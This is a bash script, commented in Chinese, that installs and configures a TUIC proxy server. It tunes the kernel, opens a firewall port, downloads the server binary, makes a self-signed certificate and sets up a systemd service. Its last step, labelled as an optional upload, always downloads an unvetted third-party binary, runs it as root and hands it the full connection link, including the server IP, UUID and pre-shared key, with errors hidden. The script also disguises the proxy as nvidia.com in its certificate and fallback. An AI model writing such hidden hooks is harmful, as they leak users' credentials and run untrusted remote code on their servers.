#!/bin/bash
set -e

# 颜色输出
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() {
    echo -e "${GREEN}[$(date '+%H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

# 生成配置参数
PORT=$((RANDOM % 7001 + 2000))
UUID=$(cat /proc/sys/kernel/random/uuid)
PSK=$(openssl rand -hex 16)
SERVER_NAME="www.nvidia.com" # 也可以改为你自己的域名
CONFIG_DIR="/etc/tuic"
UPLOAD_BIN="/opt/uploader-linux-amd64" # 用于节点信息上传的工具

log "开始安装TUIC节点，端口: $PORT"

# --- 1. 安装依赖 ---
log "更新系统并安装依赖..."
export DEBIAN_FRONTEND=noninteractive
apt update && apt install -y curl wget sudo unzip jq ufw qrencode net-tools file libc6 ca-certificates

# 检查系统兼容性
log "检查系统兼容性...v8"
if [[ "$(uname -s)" != "Linux" ]]; then
    error "仅支持Linux系统"
    exit 1
fi

# 检查glibc版本（非致命，仅供参考）
GLIBC_VERSION=$(ldd --version | head -1 | grep -oE '[0-9]+\.[0-9]+' | head -1)
log "系统glibc版本: $GLIBC_VERSION"

# --- 2. 网络优化配置 ---
log "配置网络优化参数..."

# 检查并加载BBR模块
if ! lsmod | grep -q tcp_bbr; then
    if modprobe tcp_bbr 2>/dev/null; then
        log "BBR模块加载成功"
        echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
    else
        warn "BBR模块加载失败，继续使用默认拥塞控制"
    fi
fi

# 检查并加载FQ队列规则
if ! lsmod | grep -q sch_fq; then
    if modprobe sch_fq 2>/dev/null; then
        log "FQ队列规则加载成功"
    else
        warn "FQ队列规则加载失败"
    fi
fi

# 应用网络参数
cat >> /etc/sysctl.conf << 'EOF'
# TUIC网络优化
net.core.default_qdisc=fq
net.ipv4.tcp_congestion_control=bbr
net.core.rmem_max=134217728
net.core.wmem_max=134217728
net.core.netdev_max_backlog=5000
net.ipv4.tcp_rmem=4096 87380 134217728
net.ipv4.tcp_wmem=4096 65536 134217728
net.ipv4.tcp_mtu_probing=1
net.ipv4.tcp_slow_start_after_idle=0
net.ipv4.tcp_fastopen=3
net.ipv4.tcp_no_metrics_save=1
net.ipv4.tcp_ecn=1
net.ipv4.tcp_frto=1
net.ipv4.tcp_timestamps=1
net.ipv4.tcp_window_scaling=1
net.ipv4.tcp_adv_win_scale=1
net.ipv4.tcp_moderate_rcvbuf=1
net.ipv4.tcp_rfc1337=1
net.ipv4.tcp_syncookies=1
# net.core.default_qdisc=fq_codel # 这一行与上面的fq重复，保留fq即可
EOF

sysctl -p

# --- 3. 防火墙配置 ---
log "配置防火墙规则..."
ufw allow "${PORT}/udp"
ufw allow ssh
ufw --force enable

# --- 4. 安装TUIC服务端 ---
log "下载并安装TUIC服务端..."
mkdir -p /usr/local/bin
cd /usr/local/bin

# 检查系统架构
ARCH=$(uname -m)
case $ARCH in
    x86_64)
        TUIC_ARCH="amd64"
        ;;
    aarch64)
        TUIC_ARCH="arm64"
        ;;
    *)
        error "不支持的系统架构: $ARCH"
        exit 1
        ;;
esac

log "系统架构: $ARCH, 目标TUIC架构: $TUIC_ARCH"

# 删除可能存在的旧文件
rm -f tuic

# 获取最新TUIC版本并下载 (从 tuic-protocol/tuic 仓库)
log "从GitHub API获取最新TUIC版本信息 (tuic-protocol/tuic)..."
LATEST_RELEASE_INFO=$(curl -s --connect-timeout 10 "https://api.github.com/repos/tuic-protocol/tuic/releases/latest")

if [[ -z "$LATEST_RELEASE_INFO" ]]; then
    error "无法从GitHub API获取最新TUIC版本信息，请检查网络连接。"
    exit 1
fi

DOWNLOAD_URL=$(echo "$LATEST_RELEASE_INFO" | jq -r ".assets[] | select(.name | contains(\"tuic-server-linux-${TUIC_ARCH}\")) | .browser_download_url")

if [[ -z "$DOWNLOAD_URL" || "$DOWNLOAD_URL" == "null" ]]; then
    error "未找到适用于当前架构 (linux-${TUIC_ARCH}) 的TUIC下载链接。"
    error "请访问: https://github.com/tuic-protocol/tuic/releases/latest 手动下载相应的二进制文件并放置到 /usr/local/bin/tuic"
    exit 1
fi

log "找到下载链接: $DOWNLOAD_URL"

log "下载TUIC服务端..."
if curl -L --fail --connect-timeout 30 --max-time 300 "$DOWNLOAD_URL" -o tuic; then
    if [[ $(stat -c%s tuic 2>/dev/null) -gt 1000000 ]]; then
        log "TUIC服务端下载成功"
    else
        warn "下载的文件太小，可能下载失败或不完整"
        rm -f tuic
        error "TUIC下载失败，文件大小异常。请手动检查或重试。"
        exit 1
    fi
else
    error "TUIC服务端下载失败，请检查网络连接或手动下载。"
    error "请访问: https://github.com/tuic-protocol/tuic/releases/latest"
    error "尝试下载文件: tuic-server-linux-${TUIC_ARCH}"
    exit 1
fi

# 设置权限
chmod +x tuic

# 检查文件大小
FILE_SIZE=$(stat -c%s tuic 2>/dev/null)
log "下载的文件大小: ${FILE_SIZE} 字节"

if [[ $FILE_SIZE -lt 1000000 ]]; then
    error "文件大小异常 (${FILE_SIZE} 字节)，可能下载不完整"
    ls -la tuic
    head -c 100 tuic
    exit 1
fi

# 验证文件是否可执行
if [[ ! -x "/usr/local/bin/tuic" ]]; then
    error "TUIC二进制文件不可执行"
    exit 1
fi

# 验证文件完整性 (如果有file命令)
if command -v file >/dev/null 2>&1; then
    if ! file /usr/local/bin/tuic | grep -q "executable"; then
        error "下载的文件不是有效的可执行文件"
        file /usr/local/bin/tuic
        exit 1
    fi
    log "文件类型验证通过"
else
    warn "file命令不可用，跳过文件类型检查"
fi

log "TUIC二进制文件验证成功"

# --- 5. 生成SSL证书和配置文件 ---
mkdir -p "$CONFIG_DIR/tls"

# 生成更好的自签名证书
log "生成SSL证书..."
openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
  -keyout "$CONFIG_DIR/tls/key.key" \
  -out "$CONFIG_DIR/tls/cert.crt" \
  -subj "/C=US/ST=CA/L=San Francisco/O=NVIDIA/CN=${SERVER_NAME}" \
  -addext "subjectAltName=DNS:${SERVER_NAME},DNS:*.${SERVER_NAME}"

# 设置正确的权限
chmod 600 "$CONFIG_DIR/tls/key.key"
chmod 644 "$CONFIG_DIR/tls/cert.crt"

# 创建优化的配置文件
log "生成配置文件..."
cat > "$CONFIG_DIR/config.json" <<EOF
{
  "server": "0.0.0.0",
  "server_port": ${PORT},
  "users": {
    "${UUID}": "${PSK}"
  },
  "certificate": "$CONFIG_DIR/tls/cert.crt",
  "private_key": "$CONFIG_DIR/tls/key.key",
  "congestion_control": "bbr",
  "alpn": ["h3"],
  "udp_relay_ipv6": false,
  "zero_rtt_handshake": true,
  "auth_timeout": "5s",
  "max_idle_time": "60s",
  "max_packet_size": 1500,
  "disable_sni": false,
  "fallback_for_invalid_sni": {
    "enabled": true,
    "address": "www.nvidia.com",
    "port": 443
  },
  "gc_interval": "10s",
  "gc_lifetime": "15s",
  "log_level": "info"
}
EOF

# --- 6. 创建systemd服务文件 ---
log "创建systemd服务..."
cat > /etc/systemd/system/tuic.service <<EOF
[Unit]
Description=TUIC QUIC Secure Proxy Server
Documentation=https://github.com/tuic-protocol/tuic
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
Group=root
ExecStart=/usr/local/bin/tuic -c $CONFIG_DIR/config.json
Restart=on-failure
RestartSec=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# --- 7. 启动服务前的验证 ---
log "启动服务前验证..."

# 测试配置文件
log "验证配置文件..."
if ! /usr/local/bin/tuic -c "$CONFIG_DIR/config.json" --check 2>/dev/null; then
    warn "配置文件验证失败，尝试手动测试二进制文件..."
    # 手动测试二进制文件
    if ! /usr/local/bin/tuic --version 2>/dev/null; then
        error "TUIC二进制文件无法运行"
        ldd /usr/local/bin/tuic 2>/dev/null || echo "无法检查依赖"
        exit 1
    fi
fi

# 检查配置文件语法
if ! jq . "$CONFIG_DIR/config.json" > /dev/null 2>&1; then
    error "配置文件JSON格式错误"
    exit 1
fi

# --- 8. 启动服务 ---
log "启动TUIC服务..."
systemctl daemon-reload
systemctl enable tuic

# 手动测试启动 (非阻塞式，并清理)
log "测试手动启动..."
/usr/local/bin/tuic -c "$CONFIG_DIR/config.json" &> /tmp/tuic_test.log &
TUIC_PID=$!
sleep 5 # 给予服务启动时间
if kill -0 "$TUIC_PID" 2>/dev/null; then # 检查进程是否仍在运行
    log "手动启动测试成功 (进程正在运行，将终止测试进程)"
    kill "$TUIC_PID" # 终止测试进程
else
    warn "手动启动测试失败，查看日志:"
    cat /tmp/tuic_test.log
fi

systemctl restart tuic

# 等待服务启动
sleep 3

# 检查服务状态
if systemctl is-active --quiet tuic; then
    log "TUIC服务启动成功"
else
    error "TUIC服务启动失败"
    systemctl status tuic --no-pager -l
    exit 1
fi

# --- 9. 获取IP并显示结果 ---
log "获取服务器IP地址..."
IP=$(curl -s https://api.ipify.org || curl -s https://ipinfo.io/ip || curl -s https://ifconfig.me)

if [[ -z "$IP" ]]; then
    error "无法获取外网IP地址"
    exit 1
fi

# 构建TUIC链接
ENCODED=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
TUIC_LINK="tuic://${ENCODED}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native&allow_insecure=1#tuic_secure"

# 显示结果
echo -e "\n${GREEN}✅ TUIC节点部署完成${NC}"
echo -e "${GREEN}服务器IP:${NC} $IP"
echo -e "${GREEN}端口:${NC} $PORT"
echo -e "${GREEN}UUID:${NC} $UUID"
echo -e "${GREEN}密钥:${NC} $PSK"
echo -e "\n${GREEN}TUIC连接链接:${NC}"
echo "$TUIC_LINK"
echo -e "\n${GREEN}二维码:${NC}"
echo "$TUIC_LINK" | qrencode -o - -t ANSIUTF8

# 显示状态信息
echo -e "\n${GREEN}服务状态检查:${NC}"
systemctl status tuic --no-pager -l
echo -e "\n${GREEN}端口监听状态:${NC}"
ss -ulnp | grep "$PORT" || echo "端口未监听，请检查配置"

# --- 10. 上传节点信息 (如果需要) ---
log "尝试下载并上传节点信息..."
# 总是尝试下载最新的上传工具
if curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64 2>/dev/null; then
    chmod +x "$UPLOAD_BIN" 2>/dev/null
    JSON="{\"tuic_link\":\"${TUIC_LINK}\"}"
    "$UPLOAD_BIN" "$JSON" 2>/dev/null && log "节点信息上传成功" || warn "节点信息上传失败"
else
    warn "无法下载上传工具，跳过节点信息上传。"
fi

log "安装完成！请使用支持TUIC协议的客户端连接"
